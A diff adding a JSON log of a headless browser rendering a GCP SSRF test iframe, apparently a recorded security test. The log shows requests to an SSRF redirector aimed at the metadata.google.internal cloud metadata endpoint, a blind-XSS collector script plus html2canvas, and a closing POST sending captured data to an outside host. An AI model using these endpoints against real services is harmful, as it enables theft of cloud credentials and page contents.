@@ -1,0 +1,245 @@
+[
+  {
+    "event_type": "request",
+    "url": "file:///app/render_gcp_ssrf_test_iframe.html",
+    "method": "GET",
+    "headers": {
+      "sec-ch-ua": "\"Chromium\";v=\"136\", \"HeadlessChrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Linux\""
+    },
+    "frame_url": "about:blank"
+  },
+  {
+    "event_type": "response",
+    "url": "file:///app/render_gcp_ssrf_test_iframe.html",
+    "status": 200,
+    "headers": {
+      "content-type": "text/html",
+      "last-modified": "Wed, 04 Jun 2025 18:56:09 GMT"
+    },
+    "frame_url": "about:blank"
+  },
+  {
+    "event_type": "request",
+    "url": "https://donreddy.vercel.app/",
+    "method": "GET",
+    "headers": {
+      "sec-ch-ua-platform": "\"Linux\"",
+      "referer": "",
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36",
+      "sec-ch-ua": "\"Chromium\";v=\"136\", \"HeadlessChrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
+      "sec-ch-ua-mobile": "?0"
+    },
+    "frame_url": "about:srcdoc"
+  },
+  {
+    "event_type": "response",
+    "url": "https://donreddy.vercel.app/",
+    "status": 200,
+    "headers": {
+      "content-encoding": "br",
+      "etag": "W/\"b06-1668f272800\"",
+      "age": "0",
+      "powered-by": "XLESS",
+      "access-control-allow-methods": "GET,POST",
+      "date": "Wed, 04 Jun 2025 18:56:15 GMT",
+      "content-type": "application/javascript; charset=UTF-8",
+      "last-modified": "Sat, 20 Oct 2018 01:46:40 GMT",
+      "access-control-allow-headers": "Content-Type",
+      "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
+      "cache-control": "public, max-age=0",
+      "x-vercel-cache": "MISS",
+      "access-control-allow-origin": "*",
+      "x-powered-by": "Express",
+      "server": "Vercel",
+      "x-vercel-id": "sfo1::iad1::gbxmp-1749063374607-0d77cb4fd470"
+    },
+    "frame_url": "about:srcdoc"
+  },
+  {
+    "event_type": "request",
+    "url": "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js",
+    "method": "GET",
+    "headers": {
+      "sec-ch-ua-platform": "\"Linux\"",
+      "referer": "",
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36",
+      "sec-ch-ua": "\"Chromium\";v=\"136\", \"HeadlessChrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
+      "sec-ch-ua-mobile": "?0"
+    },
+    "frame_url": "about:srcdoc"
+  },
+  {
+    "event_type": "request",
+    "url": "https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json",
+    "method": "GET",
+    "headers": {
+      "upgrade-insecure-requests": "1",
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36",
+      "sec-ch-ua": "\"Chromium\";v=\"136\", \"HeadlessChrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Linux\""
+    },
+    "frame_url": ""
+  },
+  {
+    "event_type": "response",
+    "url": "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js",
+    "status": 200,
+    "headers": {
+      "access-control-expose-headers": "*",
+      "content-encoding": "br",
+      "etag": "W/\"28552-drePBTGk88gfcLkl5KZLKsXOCEE\"",
+      "age": "3136756",
+      "x-content-type-options": "nosniff",
+      "x-jsd-version-type": "version",
+      "alt-svc": "h3=\":443\";ma=86400,h3-29=\":443\";ma=86400,h3-27=\":443\";ma=86400",
+      "x-cache": "HIT, HIT",
+      "date": "Wed, 04 Jun 2025 18:56:15 GMT",
+      "content-type": "application/javascript; charset=utf-8",
+      "x-served-by": "cache-fra-eddf8230123-FRA, cache-chi-klot8100080-CHI",
+      "vary": "Accept-Encoding",
+      "strict-transport-security": "max-age=31536000; includeSubDomains; preload",
+      "cache-control": "public, max-age=31536000, s-maxage=31536000, immutable",
+      "timing-allow-origin": "*",
+      "cross-origin-resource-policy": "cross-origin",
+      "accept-ranges": "bytes",
+      "access-control-allow-origin": "*",
+      "content-length": "44077",
+      "x-jsd-version": "1.0.0-rc.7"
+    },
+    "frame_url": "about:srcdoc"
+  },
+  {
+    "event_type": "request",
+    "url": "https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json",
+    "method": "GET",
+    "headers": {
+      "upgrade-insecure-requests": "1",
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36",
+      "sec-ch-ua": "\"Chromium\";v=\"136\", \"HeadlessChrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Linux\""
+    },
+    "frame_url": ""
+  },
+  {
+    "event_type": "response",
+    "url": "https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json",
+    "status": 200,
+    "headers": {
+      "access-control-allow-credentials": "true",
+      "access-control-allow-headers": "Access-Control-Allow-Headers, Origin, Accept, X-Requested-With, X-Requested-By-Element, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers",
+      "access-control-allow-methods": "GET, HEAD, PUT, PATCH, POST, DELETE, OPTIONS",
+      "access-control-allow-origin": "*",
+      "alt-svc": "h3=\":443\"; ma=86400",
+      "cache-control": "no-store, no-cache, must-revalidate",
+      "cf-cache-status": "DYNAMIC",
+      "cf-ray": "94a9a6311d9beac3-ORD",
+      "content-encoding": "zstd",
+      "content-location": "http://metadata.google.internal",
+      "content-type": "application/json",
+      "date": "Wed, 04 Jun 2025 18:56:15 GMT",
+      "nel": "{\"success_fraction\":0,\"report_to\":\"cf-nel\",\"max_age\":604800}",
+      "permissions-policy": "geolocation=(), microphone=(), camera=()",
+      "pragma": "no-cache",
+      "referrer-policy": "strict-origin-when-cross-origin",
+      "report-to": "{\"endpoints\":[{\"url\":\"https:\\/\\/a.nel.cloudflare.com\\/report\\/v4?s=w9qFinfdVB89X6WmjxlgVngQd8FKxzsqpNkZmXn%2BbS7jzvJqA1ayhBBymxxj4AR3dO41H6Rbs%2BtH093rt%2F9Ab19KQoO4YLooaYJbOseRS4daYDqPGljVtWR4heh6KO4vynfJeU1f\"}],\"group\":\"cf-nel\",\"max_age\":604800}",
+      "server": "cloudflare",
+      "server-timing": "cfL4;desc=\"?proto=TCP&rtt=11473&min_rtt=11417&rtt_var=3278&sent=8&recv=10&lost=0&retrans=0&sent_bytes=4018&recv_bytes=2580&delivery_rate=380485&cwnd=254&unsent_bytes=0&cid=50e6a4715fe62343&ts=427&x=0\"",
+      "strict-transport-security": "max-age=31536000; includeSubDomains",
+      "vary": "Access-Control-Request-Headers\naccept-encoding",
+      "x-content-type-options": "nosniff",
+      "x-frame-options": "SAMEORIGIN",
+      "x-powered-by": "PHP/7.4.33",
+      "x-turbo-charged-by": "LiteSpeed",
+      "x-xss-protection": "1; mode=block"
+    },
+    "frame_url": ""
+  },
+  {
+    "event_type": "requestfailed",
+    "url": "https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json",
+    "method": "GET",
+    "failure_text": "net::ERR_BLOCKED_BY_RESPONSE",
+    "frame_url": ""
+  },
+  {
+    "event_type": "response",
+    "url": "https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json",
+    "status": 200,
+    "headers": {
+      "access-control-allow-credentials": "true",
+      "access-control-allow-headers": "Access-Control-Allow-Headers, Origin, Accept, X-Requested-With, X-Requested-By-Element, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers",
+      "access-control-allow-methods": "GET, HEAD, PUT, PATCH, POST, DELETE, OPTIONS",
+      "access-control-allow-origin": "*",
+      "alt-svc": "h3=\":443\"; ma=86400",
+      "cache-control": "no-store, no-cache, must-revalidate",
+      "cf-cache-status": "DYNAMIC",
+      "cf-ray": "94a9a633bb55eac3-ORD",
+      "content-encoding": "zstd",
+      "content-location": "http://metadata.google.internal",
+      "content-type": "application/json",
+      "date": "Wed, 04 Jun 2025 18:56:16 GMT",
+      "nel": "{\"success_fraction\":0,\"report_to\":\"cf-nel\",\"max_age\":604800}",
+      "permissions-policy": "geolocation=(), microphone=(), camera=()",
+      "pragma": "no-cache",
+      "referrer-policy": "strict-origin-when-cross-origin",
+      "report-to": "{\"endpoints\":[{\"url\":\"https:\\/\\/a.nel.cloudflare.com\\/report\\/v4?s=mNbHP8Yn9%2BdT4tJLWZW78ge82tMOIJyG8Om4FB8QIDHzaEJbUH1uYJdaWK4wkmYoa9AcFdmpDKhh33dlgqKyeTRF0yrogxQM5uE%2F1J8X251HbKx1tZmRCJvmDA2Y1XNBk21Lno7M\"}],\"group\":\"cf-nel\",\"max_age\":604800}",
+      "server": "cloudflare",
+      "server-timing": "cfL4;desc=\"?proto=TCP&rtt=11518&min_rtt=11417&rtt_var=2549&sent=12&recv=12&lost=0&retrans=0&sent_bytes=5273&recv_bytes=2745&delivery_rate=380485&cwnd=257&unsent_bytes=0&cid=50e6a4715fe62343&ts=581&x=0\"",
+      "strict-transport-security": "max-age=31536000; includeSubDomains",
+      "vary": "Access-Control-Request-Headers\naccept-encoding",
+      "x-content-type-options": "nosniff",
+      "x-frame-options": "SAMEORIGIN",
+      "x-powered-by": "PHP/7.4.33",
+      "x-turbo-charged-by": "LiteSpeed",
+      "x-xss-protection": "1; mode=block"
+    },
+    "frame_url": ""
+  },
+  {
+    "event_type": "requestfailed",
+    "url": "https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json",
+    "method": "GET",
+    "failure_text": "net::ERR_BLOCKED_BY_RESPONSE",
+    "frame_url": ""
+  },
+  {
+    "event_type": "request",
+    "url": "https://donreddy.vercel.app/c",
+    "method": "POST",
+    "headers": {
+      "sec-ch-ua-platform": "\"Linux\"",
+      "referer": "",
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.7103.25 Safari/537.36",
+      "sec-ch-ua": "\"Chromium\";v=\"136\", \"HeadlessChrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
+      "content-type": "application/json",
+      "sec-ch-ua-mobile": "?0"
+    },
+    "frame_url": "about:srcdoc"
+  },
+  {
+    "event_type": "response",
+    "url": "https://donreddy.vercel.app/c",
+    "status": 200,
+    "headers": {
+      "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
+      "cache-control": "public, max-age=0, must-revalidate",
+      "x-vercel-cache": "MISS",
+      "etag": "W/\"3-kqlJ/UGEThu4xoEs3qECcI/eI6Q\"",
+      "powered-by": "XLESS",
+      "access-control-allow-methods": "GET,POST",
+      "access-control-allow-origin": "*",
+      "content-length": "3",
+      "date": "Wed, 04 Jun 2025 18:56:17 GMT",
+      "content-type": "text/html; charset=utf-8",
+      "x-powered-by": "Express",
+      "server": "Vercel",
+      "x-vercel-id": "sfo1::iad1::t8srk-1749063376509-3c8670c69cb1",
+      "access-control-allow-headers": "Content-Type"
+    },
+    "frame_url": "about:srcdoc"
+  }
+]
